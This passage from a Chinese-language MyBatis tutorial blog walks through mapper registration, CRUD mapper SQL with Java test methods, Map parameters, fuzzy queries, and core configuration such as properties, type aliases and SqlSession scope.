mapper.getUserList();</span><br><span class="line">        <span class="keyword">for</span>(User user:userList)&#123;</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭sqlSession</span></span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><font color="red">注意1:</font></p><p>is not known to the MapperRegistry.</p><p>每一个Mapper.xml都需要在Mybatis核心配置文件中注册</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;com/jh2ng/dao/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><font color="red">注意2:</font></p><p>Error parsing SQL Mapper Configuration. Cause: java.io.IOException: Could not find resource</p><p>配置路径正确，却还是提示无法找到Mapper.xml，解决如下</p><p>配置文件无法被导出或者生效的解决办法：</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--在build中配置resources，来防止资源导出失败的问题--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3、CRUD"><a href="#3、CRUD" class="headerlink" title="3、CRUD"></a>3、CRUD</h2><blockquote><p><strong>把dao改成mapper</strong></p><p><strong><font color="red">注意：增删改需要提交事务</font></strong></p></blockquote><h3 id="3-1、select"><a href="#3-1、select" class="headerlink" title="3.1、select"></a>3.1、select</h3><p>查询语句</p><ul><li>id：对应的namespace中的方法名</li><li>resultType：SQL语句执行的返回值</li><li>parameterType：参数类型</li></ul><p>1.编写接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据id查询用户</span></span><br><span class="line">User <span class="title function_">getUserById</span><span class="params">(<span class="type">int</span> id)</span>;</span><br></pre></td></tr></table></figure><p>2.编写对应的mapper中的sql语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserById&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.jh2ng.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    select * from users where id=#&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUserById</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取sqlSession对象</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MybatisUtils.getSqlSession();</span><br><span class="line">    <span class="comment">// getMapper</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> mapper.getUserById(<span class="number">1</span>);</span><br><span class="line">    System.out.println(user);</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2、insert"><a href="#3-2、insert" class="headerlink" title="3.2、insert"></a>3.2、insert</h3><p>1.编写接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 插入一个用户</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">addUser</span><span class="params">(User user)</span>;</span><br></pre></td></tr></table></figure><p>2.编写对应的mapper中的sql语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--对象中的属性可以直接取出来--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;addUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.jh2ng.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    insert into users(id,name,passwd) values (#&#123;id&#125;,#&#123;name&#125;,#&#123;passwd&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addUser</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取sqlSession对象</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MybatisUtils.getSqlSession();</span><br><span class="line">    <span class="comment">// getMapper</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> mapper.addUser(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">4</span>, <span class="string">&quot;ddd&quot;</span>, <span class="string">&quot;111&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (res &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;插入成功！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//增删改需要提交事务</span></span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    sqlSession.close();</span><br></pre></td></tr></table></figure><h3 id="3-3、update"><a href="#3-3、update" class="headerlink" title="3.3、update"></a>3.3、update</h3><p>1.编写接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改一个用户</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">updateUser</span><span class="params">(User user)</span>;</span><br></pre></td></tr></table></figure><p>2.编写对应的mapper中的sql语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;updateUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.jh2ng.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    update users set  name=#&#123;name&#125;,passwd=#&#123;passwd&#125;  where id=#&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateUser</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 获取sqlSession对象</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MybatisUtils.getSqlSession();</span><br><span class="line">    <span class="comment">// getMapper</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    mapper.updateUser(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">4</span>,<span class="string">&quot;fff&quot;</span>,<span class="string">&quot;123&quot;</span>));</span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4、delete"><a href="#3-4、delete" class="headerlink" title="3.4、delete"></a>3.4、delete</h3><p>1.编写接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 删除一个用户</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">deleteUser</span><span class="params">(<span class="type">int</span> id)</span>;</span><br></pre></td></tr></table></figure><p>2.编写对应的mapper中的sql语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">    delete from users where id=#&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteUser</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 获取sqlSession对象</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MybatisUtils.getSqlSession();</span><br><span class="line">    <span class="comment">// getMapper</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    mapper.deleteUser(<span class="number">4</span>);</span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-5、万能Map"><a href="#3-5、万能Map" class="headerlink" title="3.5、万能Map"></a>3.5、万能Map</h3><p>假设我们的实体类或者数据库中的表字段或者参数过多，应该考虑使用Map。</p><p>Map传递参数，直接在sql语句中取出key即可。</p><p>对象传递参数，直接在sql语句中取对象的属性即可。</p><p>只有一个基本类型参数的情况下，可以直接在sql中取到。</p><blockquote><p>只有一个参数可以不用写parameterType</p><p>例如通过一个id或者是一个用户名去查询的时候可以忽略不写parameterType</p></blockquote><p>多参数用map或者<strong>注解</strong>。</p><p>比如，有十几个字段的数据库，只想修改其中的几个字段，可以使用Map来实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改一个用户</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">updateUser1</span><span class="params">(Map&lt;String,Object&gt; map)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;updateUser1&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;map&quot;</span>&gt;</span></span><br><span class="line">    update users set  name=#&#123;username&#125;  where id=#&#123;userid&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>现在sql中的参数和map里的key对应</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateUser1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取sqlSession对象</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MybatisUtils.getSqlSession();</span><br><span class="line">    <span class="comment">// getMapper</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;userid&quot;</span>,<span class="number">3</span>);</span><br><span class="line">    map.put(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">    mapper.updateUser1(map);</span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-6、模糊查询"><a href="#3-6、模糊查询" class="headerlink" title="3.6、模糊查询"></a>3.6、模糊查询</h3><p>模糊查询实现的几种方式</p><p>1.Java代码执行的时候，传递通配符%%</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;User&gt; userList = mapper.getUserByName(<span class="string">&quot;%a%&quot;</span>);</span><br></pre></td></tr></table></figure><p>2.在sql拼接中使用通配符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> name <span class="keyword">like</span> &quot;%&quot;#&#123;name&#125;&quot;%&quot;</span><br></pre></td></tr></table></figure><blockquote><p>第一种不方便，第二种会造成sql注入</p></blockquote><p>3.借助mysql函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> name <span class="keyword">like</span> concat(<span class="string">&#x27;%&#x27;</span>,#&#123;name&#125;,<span class="string">&#x27;%&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="4、配置解析"><a href="#4、配置解析" class="headerlink" title="4、配置解析"></a>4、配置解析</h2><h3 id="4-1、核心配置文件"><a href="#4-1、核心配置文件" class="headerlink" title="4.1、核心配置文件"></a>4.1、核心配置文件</h3><ul><li>mybatis-config.xml</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">properties（属性）</span><br><span class="line">settings（设置）</span><br><span class="line">typeAliases（类型别名）</span><br><span class="line">typeHandlers（类型处理器）</span><br><span class="line">objectFactory（对象工厂）</span><br><span class="line">plugins（插件）</span><br><span class="line">environments（环境配置）</span><br><span class="line">environment（环境变量）</span><br><span class="line">transactionManager（事务管理器）</span><br><span class="line">dataSource（数据源）</span><br><span class="line">databaseIdProvider（数据库厂商标识）</span><br><span class="line">mappers（映射器）</span><br></pre></td></tr></table></figure><h3 id="4-2、环境配置（environments）"><a href="#4-2、环境配置（environments）" class="headerlink" title="4.2、环境配置（environments）"></a>4.2、环境配置（environments）</h3><p>MyBatis 可以配置成适应多种环境。</p><p><strong>不过要记住：尽管可以配置多个环境，但每个 SqlSessionFactory 实例只能选择一种环境。</strong></p><p>可以有多套environment，每个environment有单独的id，通过environments中default属性进行环境切换。</p><p>Mybatis默认的事务管理器是JDBC，连接池：POOLED</p><h3 id="4-3、属性（properties）"><a href="#4-3、属性（properties）" class="headerlink" title="4.3、属性（properties）"></a>4.3、属性（properties）</h3><p>可以通过properties属性来实现引用配置文件。</p><p>属性可以在外部进行配置，并可以进行动态替换。你既可以在典型的 Java 属性文件【db.properties】中配置这些属性，也可以在 properties 元素的子元素中设置。</p><p>编写一个配置文件db.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">driver</span>=<span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line"><span class="attr">url</span>=<span class="string">jdbc:mysql://localhost:3306/test?useSSL=true&amp;useUnicode=true&amp;characterEncoding=utf-8</span></span><br><span class="line"><span class="attr">username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">password</span>=<span class="string">123456</span></span><br></pre></td></tr></table></figure><p>在核心配置文件中引入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">&quot;db.properties&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;url&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>可以直接引入外部文件</li><li>可以在其中增加一些属性配置</li><li>如果两个文件有同一个字段，优先使用外部配置文件</li></ul><h3 id="4-4、类型别名（typeAliases）"><a href="#4-4、类型别名（typeAliases）" class="headerlink" title="4.4、类型别名（typeAliases）"></a>4.4、类型别名（typeAliases）</h3><ul><li>类型别名是为Java类型设置一个短的名字。</li><li>意在降低冗余的全限定类名书写。</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAlias</span> <span class="attr">type</span>=<span class="string">&quot;com.jh2ng.pojo.User&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;User&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也可以指定一个包名，MyBatis 会在包名下面搜索需要的 Java Bean。</p><p>扫描实体类的包，它的默认别名为这个类名的首字母小写</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.jh2ng.pojo&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>在实体类少的时候使用第一种方法</p><p>在实体类多的时候使用第二种方法</p><p>第一种可以自定义，第二种可以用注解自定义别名，实体类中加注解<code>@Alias(&quot;别名&quot;)</code></p></blockquote><h3 id="4-5、设置（settings）"><a href="#4-5、设置（settings）" class="headerlink" title="4.5、设置（settings）"></a>4.5、设置（settings）</h3><p><img src="http://image.jh2ing.com/image-20210522130333173.png" alt="image-20210522130333173"></p><p><img src="http://image.jh2ing.com/image-20210522124707379.png" alt="image-20210522124707379"></p><h3 id="4-6、其他配置"><a href="#4-6、其他配置" class="headerlink" title="4.6、其他配置"></a>4.6、其他配置</h3><ul><li><a href="https://mybatis.org/mybatis-3/zh/configuration.html#typeHandlers">typeHandlers（类型处理器）</a></li><li><a href="https://mybatis.org/mybatis-3/zh/configuration.html#objectFactory">objectFactory（对象工厂）</a></li><li>plugins（插件）<ul><li>Mybatis-Plus</li><li>Mybatis-generator-core</li><li>通用mapper</li></ul></li></ul><h3 id="4-7、映射器（mappers）"><a href="#4-7、映射器（mappers）" class="headerlink" title="4.7、映射器（mappers）"></a>4.7、映射器（mappers）</h3><p>MapperRegistry：注册绑定mapper文件</p><p>方式一：【推荐使用】</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;com/jh2ng/dao/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure><p>方式二：使用class文件绑定注册</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">class</span>=<span class="string">&quot;com.jh2ng.dao.UserMapper&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意点：</p><ul><li>接口和mapper配置文件的名称必须相同</li><li>接口和mapper配置文件必须在同一包下</li></ul><p>方式三：扫描包进行注册绑定</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.jh2ng.dao&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意点：</p><ul><li>接口和mapper配置文件的名称必须相同</li><li>接口和mapper配置文件必须在同一包下</li></ul><h3 id="4-8、作用域（Scope）和生命周期"><a href="#4-8、作用域（Scope）和生命周期" class="headerlink" title="4.8、作用域（Scope）和生命周期"></a>4.8、作用域（Scope）和生命周期</h3><p>不同作用域和生命周期类别是至关重要的，因为错误的使用会导致非常严重的<strong>并发问题</strong>。</p><p><img src="http://image.jh2ing.com/image-20210522134419429.png" alt="image-20210522134419429"></p><p><strong>SqlSessionFactoryBuilder</strong></p><ul><li>一旦创建了 SqlSessionFactory，就不再需要它了</li></ul><p><strong>SqlSessionFactory</strong></p><ul><li>相当于数据库连接池</li><li>一旦被创建就应该在应用的运行期间一直存在，没有任何理由丢弃它或重新创建另一个实例</li><li>SqlSessionFactory 的最佳作用域是应用作用域</li><li>最简单的就是使用单例模式或者静态单例模式</li></ul><p><strong>SqlSession</strong></p><ul><li>连接到连接池的一个请求</li><li>SqlSession 的实例不是线程安全的，因此是不能被共享的，所以它的最佳的作用域是请求或方法作用域</li><li>用完之后必须关闭，否则资源被占用！</li></ul><p><img src="http://image.jh2ing.com/image-20210522141514995.png"></p><p>一个mapper代表一个具体业务</p><h2 id="5、resultMap（解决属性名和字段名不一致的问题）"><a href="#5、resultMap（解决属性名和字段名不一致的问题）" class="headerlink" title="5、resultMap（解决属性名和字段名不一致的问题）"></a>5、resultMap（解决属性名和字段名不一致的问题）</h2><h3 id="5-1、问题"><a href="#5-1、问题" class="headerlink" title="5.1、问题"></a>5.1、问题</h3><p>数据库中的字段</p><p><img src="http://image.jh2ing.com/image-20210522154826115.png" alt="image-20210522154826115"></p><p>测试实体类字段不一样的情况</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br></pre></td></tr></table></figure><p>测试出现的问题</p><p><img src="http://image.jh2ing.com/image-20210522155736717.png" alt="image-20210522155736717"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>#&#123;id&#125;;</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 完整的<span class="keyword">sql</span>语句</span><br><span class="line"><span 